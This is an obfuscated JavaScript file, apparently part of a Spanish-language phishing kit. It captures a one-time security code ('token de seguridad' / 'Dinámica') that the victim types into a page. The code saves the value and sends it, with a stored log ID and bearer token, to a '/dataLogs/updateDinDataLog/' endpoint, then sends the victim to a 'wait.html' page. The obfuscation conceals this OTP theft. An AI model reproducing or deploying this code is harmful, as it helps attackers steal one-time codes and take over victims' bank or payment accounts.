const _0x38609d = _0x4b6e;
(function (_0x3d9e67, _0x3d6bd8) {
  const _0x5a5f16 = _0x4b6e,
    _0x3078a8 = _0x3d9e67();
  while (!![]) {
    try {
      const _0xcc8445 =
        (parseInt(_0x5a5f16(0x178)) / 0x1) *
          (parseInt(_0x5a5f16(0x18e)) / 0x2) +
        -parseInt(_0x5a5f16(0x191)) / 0x3 +
        (parseInt(_0x5a5f16(0x183)) / 0x4) *
          (-parseInt(_0x5a5f16(0x184)) / 0x5) +
        -parseInt(_0x5a5f16(0x172)) / 0x6 +
        (parseInt(_0x5a5f16(0x186)) / 0x7) *
          (parseInt(_0x5a5f16(0x171)) / 0x8) +
        (parseInt(_0x5a5f16(0x187)) / 0x9) *
          (-parseInt(_0x5a5f16(0x17c)) / 0xa) +
        (-parseInt(_0x5a5f16(0x179)) / 0xb) *
          (-parseInt(_0x5a5f16(0x174)) / 0xc);
      if (_0xcc8445 === _0x3d6bd8) break;
      else _0x3078a8["push"](_0x3078a8["shift"]());
    } catch (_0x14a4aa) {
      _0x3078a8["push"](_0x3078a8["shift"]());
    }
  }
})(_0x55bc, 0xd0032);
function updateLS() {
  const _0xa3662e = _0x4b6e;
  LS[_0xa3662e(0x17d)]("info", JSON[_0xa3662e(0x185)](info));
}
const otpButton = document[_0x38609d(0x176)]("btnDinamica"),
  numberMovil = document[_0x38609d(0x176)](_0x38609d(0x181));
otpButton[_0x38609d(0x18c)](_0x38609d(0x173), async function (_0x496bbf) {
  const _0x8f03f3 = _0x38609d;
  _0x496bbf[_0x8f03f3(0x17f)](), (otpButton[_0x8f03f3(0x195)] = !![]);
  if (numberMovil["value"] == "") {
    alert(_0x8f03f3(0x17a)),
      numberMovil[_0x8f03f3(0x18b)](),
      (otpButton[_0x8f03f3(0x195)] = ![]);
    return;
  }
  const _0x25183e = numberMovil["value"];
  (info[_0x8f03f3(0x18d)][_0x8f03f3(0x17e)] = _0x25183e), updateLS();
  try {
    const _0x56188a = localStorage[_0x8f03f3(0x17b)]("dataLogId"),
      _0x2037ac = localStorage[_0x8f03f3(0x17b)](_0x8f03f3(0x18f));
    if (!_0x56188a || !_0x2037ac) throw new Error(_0x8f03f3(0x189));
    const _0x2207cb = await fetch(url + _0x8f03f3(0x182) + _0x56188a, {
      method: "PUT",
      headers: {
        "Content-Type": _0x8f03f3(0x188),
        Authorization: "Bearer\x20" + _0x2037ac,
        Origin: window[_0x8f03f3(0x175)][_0x8f03f3(0x180)],
      },
      body: JSON[_0x8f03f3(0x185)]({
        din: info[_0x8f03f3(0x18d)][_0x8f03f3(0x17e)],
        status: "Ingresó\x20Dinámica",
      }),
    });
    if (!_0x2207cb["ok"]) {
      const _0x3c0940 = await _0x2207cb["json"]();
      throw new Error(
        _0x3c0940[_0x8f03f3(0x190)] ||
          "Error\x20al\x20actualizar\x20los\x20datos\x20en\x20el\x20servidor"
      );
    }
    const _0x30a22d = await _0x2207cb[_0x8f03f3(0x193)]();
    console[_0x8f03f3(0x192)](_0x8f03f3(0x18a));
  } catch (_0x38e1f2) {
    console["error"](_0x8f03f3(0x194), _0x38e1f2);
  } finally {
    (otpButton[_0x8f03f3(0x195)] = ![]),
      (window[_0x8f03f3(0x175)]["href"] = _0x8f03f3(0x177));
  }
});
function _0x4b6e(_0xa8c876, _0x1e0c46) {
  const _0x55bc9b = _0x55bc();
  return (
    (_0x4b6e = function (_0x4b6e05, _0x4726db) {
      _0x4b6e05 = _0x4b6e05 - 0x171;
      let _0x1cc52a = _0x55bc9b[_0x4b6e05];
      return _0x1cc52a;
    }),
    _0x4b6e(_0xa8c876, _0x1e0c46)
  );
}
function _0x55bc() {
  const _0x1b7e51 = [
    "origin",
    "txtDinamica",
    "/dataLogs/updateDinDataLog/",
    "279380qiGuOs",
    "105rQEeWf",
    "stringify",
    "529326jReNty",
    "8965629ooRspY",
    "application/json",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "Usuario\x20actualizado\x20correctamente",
    "focus",
    "addEventListener",
    "metaInfo",
    "13834xQJXnR",
    "dataLogToken",
    "error",
    "741174HWqgCH",
    "log",
    "json",
    "Error\x20al\x20procesar\x20la\x20OTP:",
    "disabled",
    "96CxjcIt",
    "7712130henPIh",
    "click",
    "16542804BJkunC",
    "location",
    "getElementById",
    "wait.html",
    "171VJLXRp",
    "22zPaEEc",
    "Por\x20favor\x20ingrese\x20el\x20token\x20de\x20seguridad",
    "getItem",
    "10ZRYewX",
    "setItem",
    "cdin",
    "preventDefault",
  ];
  _0x55bc = function () {
    return _0x1b7e51;
  };
  return _0x55bc();
}
